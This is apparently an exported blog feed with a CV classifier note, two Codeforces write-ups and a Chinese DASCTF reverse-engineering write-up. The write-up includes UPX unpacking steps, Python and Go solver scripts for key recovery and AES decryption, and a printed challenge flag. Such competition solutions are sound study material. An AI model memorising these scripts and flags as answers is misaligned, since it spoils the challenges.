<h5 id="本来dl部分给的数据做的极端处理是mean值三倍标准差结果在测温湿度之类的1h内数据根本不变化导致classifier基本上不工作这边选择改成手动给调极端数据来训分类器了"><a class="markdownIt-Anchor" href="#本来dl部分给的数据做的极端处理是mean值三倍标准差结果在测温湿度之类的1h内数据根本不变化导致classifier基本上不工作这边选择改成手动给调极端数据来训分类器了">#</a> 本来 dl 部分给的数据做的极端处理是 mean 值 ± 三倍标准差，结果在测温湿度之类的 1h 内数据根本不变化，导致 classifier 基本上不工作… 这边选择改成手动给调极端数据来训分类器了…</h5>
<h6 id="7-27更新补"><a class="markdownIt-Anchor" href="#7-27更新补">#</a> *7-27 更新（补）</h6>
<h5 id="最后更新了label的方法加入了adam优化最终准确率94"><a class="markdownIt-Anchor" href="#最后更新了label的方法加入了adam优化最终准确率94">#</a> 最后更新了 label 的方法，加入了 adam 优化，最终准确率 94%</h5>
<p><img loading="lazy" data-src="cv%E4%B8%8E%E4%B8%80%E4%BA%9Bclassify%E4%BA%8B%E9%A1%B9%E8%AE%B0%E5%BD%95/image-20230727115911697.png" alt="image-20230727115911697"></p>
<h6 id="实测效果也是不错来的有点点过于灵敏置信度给的不准实际使用稍微要求有点严苛"><a class="markdownIt-Anchor" href="#实测效果也是不错来的有点点过于灵敏置信度给的不准实际使用稍微要求有点严苛">#</a> （实测效果也是不错来的，有点点过于灵敏，置信度给的不准，实际使用稍微要求有点严苛）</h6>
<h6 id="不过背景处理啥的还学不太明白也没啥时间就先这样子了"><a class="markdownIt-Anchor" href="#不过背景处理啥的还学不太明白也没啥时间就先这样子了">#</a> 不过背景处理啥的还学不太明白，也没啥时间，就先这样子了</h6>
]]></content>
      <tags>
        <tag>cv</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce:1720C</title>
    <url>/2022/08/28/codeforce-1720C/</url>
    <content><![CDATA[<h1 id="codeforces-1720c"><a class="markdownIt-Anchor" href="#codeforces-1720c">#</a> codeforces 1720C</h1>
<span id="more"></span>
<h3 id="the-problem"><a class="markdownIt-Anchor" href="#the-problem">#</a> The problem</h3>
<blockquote>
<p>C. Corners<br>
time limit per test1 second<br>
memory limit per test256 megabytes<br>
inputstandard input<br>
outputstandard output<br>
You are given a matrix consisting of n rows and m columns. Each cell of this matrix contains 0 or 1.<br>
Let’s call a square of size 2×2 without one corner cell an L-shape figure. In one operation you can take one L-shape figure, with at least one cell containing 1 and replace all numbers in it with zeroes.<br>
Find the maximum number of operations that you can do with the given matrix.</p>
<blockquote>
<p>Input<br>
The first line contains one integer t (1≤t≤500) — the number of test cases. Then follow the descriptions of each test case.<br>
The first line of each test case contains two integers n and m (2≤n,m≤500) — the size of the matrix.<br>
Each of the following n lines contains a binary string of length m — the description of the matrix.<br>
It is guaranteed that the sum of n and the sum of m over all test cases does not exceed 1000.<br>
Output<br>
For each test case output the maximum number of operations you can do with the given matrix.</p>
</blockquote>
</blockquote>
<!--more-->
<h5 id="at-first-i-didnt-have-a-clue-so-i-tried-to-do-a-brute-force-didnt-work-out-of-coursethe-data-volume-is-too-large-so-i-was-wondering-whether-it-could-be-solved-by-dynamic-programing-i-tried-this"><a class="markdownIt-Anchor" href="#at-first-i-didnt-have-a-clue-so-i-tried-to-do-a-brute-force-didnt-work-out-of-coursethe-data-volume-is-too-large-so-i-was-wondering-whether-it-could-be-solved-by-dynamic-programing-i-tried-this">#</a> At first, I didn’t have a clue. So I tried to do a brute force. Didn’t work out of course.The data volume is too large. So I was wondering whether it could be solved by dynamic programing. I tried this:</h5>
<blockquote></blockquote>
<p><code>sum[x][y]=max(sum[x-1][y-1]+b[x][y]-b[x-1][y-1],sum[x-2][y-2]+b[x][y]-b[x-2][y-2])</code></p>
<h6 id="sum-stands-for-the-maximum-number-we-need-to-solve-and-bxy-stands-for-the-sum-of-a1~x1~y"><a class="markdownIt-Anchor" href="#sum-stands-for-the-maximum-number-we-need-to-solve-and-bxy-stands-for-the-sum-of-a1~x1~y">#</a> sum[][] stands for the maximum number we need to solve, and b[x][y] stands for the sum of a[1~x][1~y].</h6>
<h5 id="it-seemed-closed-but-got-a-wa-well-the-initial-square-was-harder-to-define-then-i-thought-after-a-few-tried-i-decided-to-abandon-this-dp-method"><a class="markdownIt-Anchor" href="#it-seemed-closed-but-got-a-wa-well-the-initial-square-was-harder-to-define-then-i-thought-after-a-few-tried-i-decided-to-abandon-this-dp-method">#</a> It seemed closed, but got a WA. Well, the initial square was harder to define then I thought. After a few tried, I decided to abandon this dp method.</h5>
<h5 id="it-was-some-time-before-the-right-answer-occur-to-me-its-actually-pretty-easy"><a class="markdownIt-Anchor" href="#it-was-some-time-before-the-right-answer-occur-to-me-its-actually-pretty-easy">#</a> It was some time before the right answer occur to me. It’s actually pretty easy.</h5>
<h5 id="search-every-square-of-size-22-if-exists-one-square-contains-at-least-two-0then-the-maximum-number-is-the-number-of-1-else-the-maximun-number-is-the-number-of-1-1if-there-contains-0-or-the-maximun-number-is-the-number-of-1-2if-the-whole-square-is-1"><a class="markdownIt-Anchor" href="#search-every-square-of-size-22-if-exists-one-square-contains-at-least-two-0then-the-maximum-number-is-the-number-of-1-else-the-maximun-number-is-the-number-of-1-1if-there-contains-0-or-the-maximun-number-is-the-number-of-1-2if-the-whole-square-is-1">#</a> Search every square of size 2*2, if exists one square contains at least two ‘0’,then the maximum number is the number of ‘1’, else the maximun number is the number of ‘1’- 1(if there contains ‘0’) or the maximun number is the number of ‘1’- 2(if the whole square is ‘1’)</h5>
]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>codeforce-817E</title>
    <url>/2022/09/02/codeforce-817E/</url>
    <content><![CDATA[<h1 id="codeforces-817e"><a class="markdownIt-Anchor" href="#codeforces-817e">#</a> codeforces 817E</h1>
<span id="more"></span>
<h3 id="the-problem"><a class="markdownIt-Anchor" href="#the-problem">#</a> The problem</h3>
<blockquote>
<p>E. Counting Rectangles<br>
time limit per test6 seconds<br>
memory limit per test256 megabytes<br>
inputstandard input<br>
outputstandard output<br>
You have n rectangles, the i-th rectangle has height hi and width wi.<br>
You are asked q queries of the form hs ws hb wb.<br>
For each query output, the total area of rectangles you own that can fit a rectangle of height hs and width ws while also fitting in a rectangle of height hb and width wb. In other words, print ∑hi⋅wi for i such that hs&lt;hi&lt;hb and ws&lt;wi&lt;wb.<br>
Please note, that if two rectangles have the same height or the same width, then they cannot fit inside each other. Also note that you cannot rotate rectangles.<br>
Please note that the answer for some test cases won’t fit into 32-bit integer type, so you should use at least 64-bit integer type in your programming language (like long long for C++).</p>
<blockquote>
<p>Input<br>
The first line of the input contains an integer t (1≤t≤100) — the number of test cases.<br>
The first line of each test case two integers n,q (1≤n≤105; 1≤q≤105) — the number of rectangles you own and the number of queries.<br>
Then n lines follow, each containing two integers hi,wi (1≤hi,wi≤1000) — the height and width of the i-th rectangle.<br>
Then q lines follow, each containing four integers hs,ws,hb,wb (1≤hs&lt;hb, ws&lt;wb≤1000) — the description of each query.<br>
The sum of q over all test cases does not exceed 105, and the sum of n over all test cases does not exceed 105.<br>
Output<br>
For each test case, output q lines, the i-th line containing the answer to the i-th query.</p>
<blockquote>
<p>Example<br>
inputCopy<br>
3<br>
2 1<br>
2 3<br>
3 2<br>
1 1 3 4<br>
5 5<br>
1 1<br>
2 2<br>
3 3<br>
4 4<br>
5 5<br>
3 3 6 6<br>
2 1 4 5<br>
1 1 2 10<br>
1 1 100 100<br>
1 1 3 3<br>
3 1<br>
999 999<br>
999 999<br>
999 998<br>
1 1 1000 1000<br>
outputCopy<br>
6<br>
41<br>
9<br>
0<br>
54<br>
4<br>
2993004</p>
</blockquote>
</blockquote>
</blockquote>
<h5 id="note"><a class="markdownIt-Anchor" href="#note">#</a> Note</h5>
<h5 id="in-the-first-test-case-there-is-only-one-query-we-need-to-find-the-sum-of-areas-of-all-rectangles-that-can-fit-a-11-rectangle-inside-of-it-and-fit-into-a-34-rectangle"><a class="markdownIt-Anchor" href="#in-the-first-test-case-there-is-only-one-query-we-need-to-find-the-sum-of-areas-of-all-rectangles-that-can-fit-a-11-rectangle-inside-of-it-and-fit-into-a-34-rectangle">#</a> In the first test case, there is only one query. We need to find the sum of areas of all rectangles that can fit a 1×1 rectangle inside of it and fit into a 3×4 rectangle.</h5>
<h5 id="only-the-23-rectangle-works-because-12-comparing-heights-and-13-comparing-widths-so-the-11-rectangle-fits-inside-and-23-comparing-heights-and-34-comparing-widths-so-it-fits-inside-the-34-rectangle-color"><a class="markdownIt-Anchor" href="#only-the-23-rectangle-works-because-12-comparing-heights-and-13-comparing-widths-so-the-11-rectangle-fits-inside-and-23-comparing-heights-and-34-comparing-widths-so-it-fits-inside-the-34-rectangle-color">#</a> Only the 2×3 rectangle works, because 1&lt;2 (comparing heights) and 1&lt;3 (comparing widths), so the 1×1 rectangle fits inside, and 2&lt;3 (comparing heights) and 3&lt;4 (comparing widths), so it fits inside the 3×4 rectangle. $\color</h5>
]]></content>
      <tags>
        <tag>codeforces</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>das202311月赛</title>
    <url>/2023/11/26/das202311%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h6 id="preface说实话一直打不明白这个das这今年最后一次算是比较认真打的一次最后是稳稳第一拿下了但是好像和我关系不大不能说没有贡献吧但是光自己做肯定是差很多的还是tcl5555555"><a class="markdownIt-Anchor" href="#preface说实话一直打不明白这个das这今年最后一次算是比较认真打的一次最后是稳稳第一拿下了但是好像和我关系不大不能说没有贡献吧但是光自己做肯定是差很多的还是tcl5555555">#</a> PREFACE：说实话一直打不明白这个 das，这今年最后一次算是比较认真打的一次，最后是稳稳第一拿下了但是好像和我关系不大… 不能说没有贡献吧但是光自己做肯定是差很多的… 还是 tcl5555555</h6>
<span id="more"></span>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc">#</a> misc</h2>
<p>帮着看了一眼，有一道题提出来的是一个 upx 打包的 elf，简单分析发现用的 <code>upx-4.2.1-amd64_linux</code>  版本，直接官网找了再 upx -d 即可，里面 base64 变表，解出来即可</p>
<h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> re</h2>
<h3 id="letsgo"><a class="markdownIt-Anchor" href="#letsgo">#</a> letsgo</h3>
<p>dll 里面 upx 3.94，自己 <code>upx file</code>  加一个 dll 壳，发现了三四个被修改了的标志位，修复即可 <code>upx -d</code></p>
<p>主程序没东西，有两个地方加载了 dll，断点查看，这里是抽卡用的逻辑</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127102107311.png" alt="image-20231127102107311"></p>
<p>里面有解压图片的操作：</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127102211939.png" alt="image-20231127102211939"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">split_and_process_file</span>(<span class="params">input_file_path</span>):</span><br><span class="line">    <span class="comment"># 读取原始文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line"></span><br><span class="line">    bytes_array = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bytes_array) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(bytes_array):</span><br><span class="line">            bytes_array[i] ^= bytes_array[i + <span class="number">2</span>]</span><br><span class="line">            bytes_array[i] ^= <span class="number">0xf</span></span><br><span class="line">        bytes_array[i] ^= <span class="number">0xf</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;output_<span class="subst">&#123;<span class="number">1</span>&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">        output_file.write(bytes_array)</span><br><span class="line"></span><br><span class="line">split_and_process_file(<span class="string">&#x27;D:\\reverse\\challange\\das11\\re\\DAS10letsgo\\letsgo\\res\\wwww&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_and_process_file</span>(<span class="params">input_file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line"></span><br><span class="line">    split_pattern = <span class="string">b&#x27;\xff\xd8\xff\xe0&#x27;</span></span><br><span class="line"></span><br><span class="line">    parts = data.split(split_pattern)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> part_index, part <span class="keyword">in</span> <span class="built_in">enumerate</span>(parts):</span><br><span class="line">        bytes_array = <span class="built_in">bytearray</span>(<span class="string">b&#x27;\xFF\xD8\xFF\xE0&#x27;</span>) + <span class="built_in">bytearray</span>(part)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;flag_<span class="subst">&#123;part_index&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">            output_file.write(bytes_array)</span><br><span class="line"></span><br><span class="line">split_and_process_file(<span class="string">&#x27;output_1.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>你们二次元差不多得了</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127102432655.png" alt="image-20231127102432655"></p>
<p>于是你发现前面做的没有意义</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127102447196.png" alt="image-20231127102447196"></p>
<p>那就只有这里了：</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127102819995.png" alt="image-20231127102819995"></p>
<p>这里拿到 key：</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127102859858.png" alt="image-20231127102859858"></p>
<p>这里是啥呢：</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127103327070.png" alt="image-20231127103327070"></p>
<p>画一下图发现是蒙特卡罗模拟 π，下面 <code>COERCE_UNSIGNED_INT64</code>  强制将 π 解释为整数，然后作为 seed 生成一组 xor 用的随机数</p>
<p>下面就是一个 aes192，这里 ida 反编译不出来，看看汇编即可找到 key 和密文</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127103525934.png" alt="image-20231127103525934"></p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127103542503.png" alt="image-20231127103542503"></p>
<p>最搞心态的一点是，这里的蒙特卡罗模拟是跑不出来的（而且本身模拟 golang 也是一个相当麻烦的操作），首先你得猜这里就是 π，以及四舍五入的情况，进行一定量的爆破操作，结果这地方魔改源码在 rand 里面多加了一个异或！</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127103758800.png" alt="image-20231127103758800"></p>
<p>给你逆天逆完了</p>
<p>脚本：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">  <span class="string">&quot;fmt&quot;</span></span><br><span class="line">  <span class="string">&quot;math&quot;</span></span><br><span class="line">  <span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  bits := math.Float64bits(math.Pi)</span><br><span class="line">  val := bits % <span class="number">0x5F5E100</span></span><br><span class="line">  rand.Seed(<span class="type">int64</span>(val))</span><br><span class="line">  key := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>)</span><br><span class="line">  <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">24</span>; i++ &#123;</span><br><span class="line">    key = <span class="built_in">append</span>(key, (rand.Int()^<span class="number">0xa</span>)%<span class="number">100</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  fmt.Println(key)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">arr = [<span class="number">37</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">48</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">47</span>, <span class="number">56</span>, <span class="number">91</span>, <span class="number">37</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">3</span>, <span class="number">82</span>, <span class="number">64</span>, <span class="number">54</span>, <span class="number">76</span>, <span class="number">80</span>, <span class="number">88</span>, <span class="number">54</span>, <span class="number">97</span>, <span class="number">0</span>, <span class="number">53</span>]</span><br><span class="line">rawkey = struct.pack(<span class="string">&quot;&lt;3Q&quot;</span>, <span class="number">0x5B566461493D5E41</span>, <span class="number">0x293A774E2E4B3250</span>, <span class="number">0x4C650A692B391345</span>)</span><br><span class="line"><span class="built_in">print</span>(rawkey)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">    arr[i] ^= rawkey[i]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>(arr)</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">m1 = aes.decrypt(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;ff44ac7700732a16589f7ff8bdbaa923&quot;</span>))</span><br><span class="line">m2 = aes.decrypt(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;57c29c367a781ead5fb143469d75f319&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(m1 + m2)</span><br></pre></td></tr></table></figure>
<h3 id="ezpython"><a class="markdownIt-Anchor" href="#ezpython">#</a> ezpython</h3>
<p>…</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127104104569.png" alt="image-20231127104104569"></p>
<p>反编译拿到：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">adjust_length</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="built_in">str</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &gt; <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">str</span> = <span class="built_in">str</span>[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">yuanshen</span>(<span class="params">array, start, end</span>):</span><br><span class="line">    num = <span class="built_in">len</span>(array)</span><br><span class="line">    dis = [</span><br><span class="line">        <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * num</span><br><span class="line">    tree = [</span><br><span class="line">        <span class="literal">False</span>] * num</span><br><span class="line">    parent = [</span><br><span class="line">        -<span class="number">1</span>] * num</span><br><span class="line">    dis[start] = <span class="number">0</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qidong</span>(<span class="params"><span class="built_in">input</span>, key, IV</span>):</span><br><span class="line">    cipher = pyDes.des(key, pyDes.CBC, IV, pad = <span class="literal">None</span>, padmode = pyDes.PAD_PKCS5)</span><br><span class="line">    encrypted_data = cipher.encrypt(<span class="built_in">input</span>)</span><br><span class="line">    encrypted_hex_list = encrypted_data()</span><br><span class="line">    <span class="keyword">return</span> encrypted_hex_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    data = [</span><br><span class="line">        <span class="number">159</span>,</span><br><span class="line">        <span class="number">41</span>,</span><br><span class="line">        <span class="number">201</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">60</span>,</span><br><span class="line">        <span class="number">44</span>,</span><br><span class="line">        <span class="number">34</span>,</span><br><span class="line">        <span class="number">203</span>,</span><br><span class="line">        <span class="number">56</span>,</span><br><span class="line">        <span class="number">116</span>,</span><br><span class="line">        <span class="number">186</span>,</span><br><span class="line">        <span class="number">13</span>,</span><br><span class="line">        <span class="number">71</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">30</span>,</span><br><span class="line">        <span class="number">84</span>,</span><br><span class="line">        <span class="number">123</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">54</span>,</span><br><span class="line">        <span class="number">106</span>,</span><br><span class="line">        <span class="number">56</span>,</span><br><span class="line">        <span class="number">17</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">236</span>,</span><br><span class="line">        <span class="number">25</span>,</span><br><span class="line">        <span class="number">12</span>,</span><br><span class="line">        <span class="number">80</span>,</span><br><span class="line">        <span class="number">178</span>,</span><br><span class="line">        <span class="number">165</span>,</span><br><span class="line">        <span class="number">123</span>]</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&#x27;请输入key: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong key lenth!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;请输入flag: &#x27;</span>)</span><br><span class="line">    array = [</span><br><span class="line">        [</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">8</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">8</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">3</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">5</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>]]</span><br><span class="line">    t = yuanshen(array, <span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">    IV = (<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line">)(t())</span><br><span class="line">    IV = adjust_length(IV)</span><br><span class="line">    check = qidong(flag, key, IV)</span><br><span class="line">    <span class="keyword">if</span> check == data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;yes,yes,yes!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;bad,bad,bad!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>反编译有问题，iv 拿不到，但是就差八位</p>
<p><img loading="lazy" data-src="das202311%E6%9C%88%E8%B5%9B/image-20231127111045546.png" alt="image-20231127111045546"></p>
<p>晚点出个完整的 python 各个版本应对策略（立 flag &amp; 鸽）dis 一下自己看</p>
<p>结合一下就加上 <code>DASCTF&#123;</code> 呗，给他爆一位： <code>DASCTF&#123;D0_U_4ls0_l1k3_7uansH3n&#125;</code></p>
<p>TODO：后面再补，<s>感觉麻烦死了新东西也不多</s> ，懒了</p>
]]></content>
  </entry>
  <entry>
    <title>docker操作记录</title>
    <url>/2023/10/03/docker%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h6 id="preface记录"><a class="markdownIt-Anchor" href="#preface记录">#</a> PREFACE：记录</h6>
<span id="more"></span>
